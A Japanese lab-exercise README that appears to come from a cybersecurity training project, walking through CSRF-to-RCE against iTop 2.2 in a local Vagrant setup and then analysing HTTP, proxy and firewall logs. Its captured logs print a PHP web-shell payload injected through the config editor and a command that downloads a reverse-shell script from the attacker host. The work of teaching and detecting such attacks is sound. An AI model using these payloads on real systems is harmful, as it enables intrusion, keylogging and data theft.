# クロスサイトリクエストフォージェリ脆弱性攻撃演習について
## Motivation
攻撃者 (Attacker) がクロスサイトリクエストフォージェリ（CSRF）の脆弱性を持つウェブサイト (Target) にユーザを誘導することにより、このサイトにアクセスしたユーザのブラウザ環境で不正スクリプトが実行される。CSRFによる攻撃や情報漏洩が現実社会においてどのように発生するかを理解することは重要である。

## 学習目標
CyExcが提供する本演習では、CSRFの脆弱性やこれが利用された攻撃の手法や脅威の理解を目的とし、次の演習を行う。
1. RCE via CSRF in iTopを再現し、CSRFによるRemote Code Excution（RCE）
2. Reverse Shellを利用して、TCP snifferやKeyloggerプログラムを利用した情報収集
3. Target OSのファイアウォールログについて

TCP snifferやKeyloggerのコードは倫理の観点から、ここでの公開はしないこととする。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/block.png" title="Ex4演習環境構成図">

## Prerequisite
* Vagrant
  * Plugin: landrush, vagrant-vbguest
  * Packer

## Installation　　
* Vagrant　　　
1. [CyExc用box](https://github.com/CyExc/CyExc/tree/master/2017/CyExc_Box)を作成する。
2. $ vagrant up --provision　　　   
3. $ vagrant landrush ls　　　   
ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。　　　   
```
target.cyexc-target            192.168.33.10
10.33.168.192.in-addr.arpa     target.cyexc-target
attacker.cyexc-attacker        192.168.33.20
20.33.168.192.in-addr.arpa     attacker.cyexc-attacker
````
4. target側のOS起動  <br>
$ vagrant ssh target  <br>
	i. $ cd target/　　　    <br>
	ii.$ sudo docker-compose up --build  <br>
5. attacker側のOS起動  <br>
$ vagrant ssh attacker  <br>
	i. $ cd attacker/　　　      <br>
	ii.$ sudo docker-compose up --build  <br>

## シナリオ
AttackerがiTop version 2.2の利用者に対し、不正なリクエストを含んだサイトアクセスを誘導したとする。本演習では、CSRF攻撃によるRCEの実行を再現する。AttackerからTargetウェブサーバにRCEを行い、Reverse ShellスクリプトをTargetウェブサーバに設置する。Reverse ShellスクリプトからTCP snifferやKeyloggerをTargetウェブサーバに設置し、HTTP情報やキーボード入力を監視する。

## Steps
1. ht&#8203;tp://target.cyexc-target:8000/にアクセスする。
2. iTopのセットアップを行う。MySQL情報はTarget OSのDocker画面に以下の様に出力される。adminアカウントを作成し、iTopセットアップ終了後にログオフする。
```
itop_1  | ========================================================================
itop_1  | You can now connect to this MySQL Server using:
itop_1  |
itop_1  |     mysql -uadmin -poGp9sCdlyiTK -h<host> -P<port>
itop_1  |
itop_1  | Please remember to change the above password as soon as possible!
itop_1  | MySQL user 'root' has no password but only allows local connections
itop_1  | ========================================================================
```
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/itop.png" title="Screenshot1">

3. iTop利用者がht&#8203;tp://ww&#8203;w.attacker.cyexc-attacker:8081/login.htmlへのアクセスをメール等で誘導されたとし、このURLにアクセスし「submit」ボタンを押下する。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/csrfhtml.png" width=400 title="Screenshot2">

4. adminアカウントでログインする。
<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/csrfcomplete.png" width=400 title="Screenshot3">

5. RCE via CSRF in iTopの脆弱性を利用し、TargetにRCEを実行しReverse ShellスクリプトをTargetウェブサーバにダウンロードする。なお、テストではスクリプトを作成しRCEを実行した。RCEやReverse Shellスクリプトは倫理の観点から、ここでの公開はしないこととする。
6. Reverse ShellスクリプトからTcp SnifferプログラムやKeyloggerプログラムをTarget OSに設置する。

## ログについて
### itopサーバでHTTP通信をキャプチャ
1. itopコンテナにログイン
```
vagrant@target:~/target$ sudo docker-compose exec itop bash
```
2. ngrepを使用してHTTP通信をキャプチャ
```
root@72753ea0c164:/# ngrep -W byline 'HTTP' -q > ngrep.log
```
3. itopコンテナをログアウト
4. itopコンテナのcontainer IDを調べる
```
vagrant@target:~/target$ sudo docker ps
vagrant@target:~$ sudo docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                            NAMES
72753ea0c164        myitop              "/run.sh"           About an hour ago   Up About an hour    3306/tcp, 0.0.0.0:8000->80/tcp   target_itop_1
```
5. 取得したngrepのログをTarget OSにコピー
```
vagrant@target:~/target$ sudo docker cp 72753ea0c164:/ngrep.log .
```

### itopサーバのプロキシログ
HTTP通信をキャプチャ時と同様、docker cpを使用してApache2のプロキシログを取得
```
vagrant@target:~/target$ sudo docker cp 72753ea0c164:/var/log/apache2/access.log .
vagrant@target:~/target$ sudo docker cp 72753ea0c164:/var/log/apache2/error.log .
```
### ファイアウォール
ファイアウォールは「ufw」を使用した。Vagrant環境のネットワークは下記のように設定されている。VagrantのIPアドレスは、eth1に設定している。

```
vagrant@target:~/target$ ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:66:7a:0c  
          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe66:7a0c/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:543819 errors:0 dropped:0 overruns:0 frame:0
          TX packets:172381 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:588131017 (588.1 MB)  TX bytes:14805098 (14.8 MB)

eth1      Link encap:Ethernet  HWaddr 08:00:27:8f:41:70  
          inet addr:192.168.33.10  Bcast:192.168.33.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe8f:4170/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5067 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4493 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:679866 (679.8 KB)  TX bytes:3684787 (3.6 MB)
```

ufwのデフォルトではeth0のみのファイアウォール設定になっているので、eth1のファイアウォール設定を以下のようにして行う。ufwのログは`/var/log/ufw.log`に記録される。

```
vagrant@target:/var/log$ sudo ufw allow in on eth1 to any
Rule added
Rule added (v6)
vagrant@target:/var/log$ sudo ufw allow out on eth1 to any
Rule added
Rule added (v6)
vagrant@target:/var/log$ sudo ufw status verbose
Status: active
Logging: on (full)
Default: allow (incoming), allow (outgoing), deny (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
Anywhere on eth1           ALLOW IN    Anywhere
Anywhere (v6) on eth1      ALLOW IN    Anywhere (v6)

Anywhere                   ALLOW OUT   Anywhere on eth1
Anywhere (v6)              ALLOW OUT   Anywhere (v6) on eth1
```

## CSRF
CSRFはクロスサイトスクリプティング（XSS）と似ているウェブ脆弱性のひとつである。XSSは「動的ウェブサイト」の脆弱性でJavaScriptを利用した攻撃に対し、CSRFはウェブアプリケーションに対する、またはその脆弱性を利用したウェブサーバに対する攻撃である。CSRFはウェブサーバ上で不正なスクリプトを実行する。

CSRFの事象をWEBサーバのログで確認する。

* AttackerウェブサーバからTargetウェブサーバに不正なスクリプト含むHTTPリクエスト

``
T 192.168.33.1:60236 -> 172.18.0.2:80 [AP]
POST /env-production/itop-config/config.php?c%5Bmenu%5D=ConfigEditor HTTP/1.1.
Referer: http://www.attacker.cyexc-attacker:8081/login.html.
operation=save&prev_config=1&new_config=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29+die%28passthru%28%24_GET%5B%27cmd%27%5D%29%29%3B+%3F%3E
``

* adminアカウントでログイン

``
T 192.168.33.1:60236 -> 172.18.0.2:80 [AP]
POST /env-production/itop-config/config.php?c%5Bmenu%5D=ConfigEditor HTTP/1.1.
auth_user=admin&auth_pwd=1234&loginop=login&operation=save&prev_config=1&new_config=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29+die%28passthru%28%24_GET%5B%27cmd%27%5D%29%29%3B+%3F%3E
``

## RCE
RCEとは、AttackerがTargetマシンまたはTargetマシンのプロセスで任意のコードを実行することである。

* RCEを利用してReverse ShellスクリプトをTargetウェブサーバにダウンロード

``
T 192.168.33.20:56760 -> 172.18.0.2:80 [AP]
GET /pages/UI.php?cmd=wget%20http://www.attacker.cyexc-attacker:8081/reverseShellClient.js HTTP/1.1.
``

* Reverse Shellスクリプトを起動し、TargetウェブサーバとAttacker間を接続
iTopコンテナから直接Attackerに接続しているため、Targetのファイアウォールログで接続を確認できない。

Targetウェブサーバ画面

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/rce.png" width=400 title="Screenshot4">

Attacker画面

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/rce2.png" width=400 title="Screenshot5">

取得したログはこちら <br>
＠[iTopコンテナプロキシ ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex4/logs/ngrep.log) <br>
＠[iTopコンテナプロキシ access.log](https://github.com/CyExc/CyExc/blob/master/2017/ex4/logs/access.log) <br>
＠[iTopコンテナプロキシ error.log](https://github.com/CyExc/CyExc/blob/master/2017/ex4/logs/error.log) <br>

## Targetマシンの情報収集方法について
Targetウェブサーバの情報を収集するため、TCP snifferプログラムとKeyloggerプログラムを設置する。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/rs.png" width=400 title="Screenshot6">

### TCP snifferプログラム
スニファリングとは、LAN上を流れるパケットを盗聴することである。本演習では、HTTPプロトコル（TCP port80）を盗聴するプログラムを作成した。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/sniffer.png" height=270 title="Screenshot7">

* ufwファイアウォールログのパラメータ
    - IN: the ingoing interface
    - OUT: the outgoing interface
    - TOS: Type of service
    - DST: Destination IP address
    - SRC: Source IP address
    - TTL: time to live
    - DF: "Don't Fragment" bit
    - SPT: Source port
    - DPT: Destination port

ファイアウォールログで、TCPポート4444を使ってTCP送信していることを確認する。

``
Feb  6 10:22:26 vagrant-ubuntu-trusty-64 kernel: [33106.625147] [UFW AUDIT] IN=eth1 OUT= MAC=08:00:27:8f:41:70:08:00:27:18:2f:2c:08:00 SRC=192.168.33.20 DST=192.168.33.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=15051 DF PROTO=TCP SPT=4444 DPT=49477 WINDOW=227 RES=0x00 ACK FIN URGP=0
``

``
Feb  6 10:22:26 vagrant-ubuntu-trusty-64 kernel: [33106.625180] [UFW AUDIT INVALID] IN=eth1 OUT= MAC=08:00:27:8f:41:70:08:00:27:18:2f:2c:08:00 SRC=192.168.33.20 DST=192.168.33.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=15051 DF PROTO=TCP SPT=4444 DPT=49477 WINDOW=227 RES=0x00 ACK FIN URGP=0
``

``
Feb  6 10:22:26 vagrant-ubuntu-trusty-64 kernel: [33106.625186] [UFW BLOCK] IN=eth1 OUT= MAC=08:00:27:8f:41:70:08:00:27:18:2f:2c:08:00 SRC=192.168.33.20 DST=192.168.33.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=15051 DF PROTO=TCP SPT=4444 DPT=49477 WINDOW=227 RES=0x00 ACK FIN URGP=0
``

以下はAttackerで受信したTCPパケット

```html
src: 192.168.33.1:61210
dest: 172.18.0.2:80
data
GET /pages/keylogger.html HTTP/1.1
Host: target.cyexc-target:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: itop-f4d1397579a9f1ce3bad38332495a063=2hnl7h935ulmgnlkuiggt6n6v0
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 05 Feb 2018 21:13:57 GMT
If-None-Match: "3cf-5647d8a44af40-gzip"
Cache-Control: max-age=0
```

取得したログはこちら
＠[Target OS ufw.log](https://github.com/CyExc/CyExc/blob/master/2017/ex4/logs/ufw.log)

### Keyloggerプログラム
Keyloggerとは、利用者のキーボード入力情報を記録するツールのことである。本演習では、特定のHTMLに入力されたキーボード情報をAttackerに送信する。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/keylogger.png" height=270 title="Screenshot8">

TargetウェブサーバでHTML Keylggerのスクリーンショット

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/html_keylogger.png" width=400 title="Screenshot9">

Attackerが受信したキー入力情報の一部
```
{"k":"T","t":1788970020},{"k":"h","t":1788970479},{"k":"i","t":1788970730},{"k":"s","t":1788970942},{"k":" ","t":1788971230},{"k":"i","t":1788971456},{"k":"s","t":1788971623}]
```

本演習では、Keyloggerは特定HTMLで行った。現実社会では、XSS攻撃とKeyloggerスクリプトを組み合わせて行われたり、TCP snifferとKeyloggerの情報がAttackerに流出することで、標的型攻撃段階5につながる。

## References
* [Corss-Site Request Forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
* [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
* [JPCERT/CC CSRFとその対策](https://www.jpcert.or.jp/securecoding/AntiCSRF-201510.pdf)
* [RCE via CSRF in iTop](https://www.htbridge.com/advisory/HTB23293)
* [iTop - Security Vulnerability: Config Editor](https://sourceforge.net/p/itop/tickets/1202/)
* [2015年JPCERT ログを活用した高度サイバー攻撃の早期発見と分析](https://www.jpcert.or.jp/research/APT-loganalysis_Presen_20151117.pdf)
* [Detecting Attacks on Web Applications from Log
Files](https://www.sans.org/reading-room/whitepapers/logging/detecting-attacks-web-applications-log-files-2074)
* [ubuntu ufw](https://help.ubuntu.com/community/UFW)
* [ngrep examples](https://github.com/jpr5/ngrep/blob/master/EXAMPLES.md)
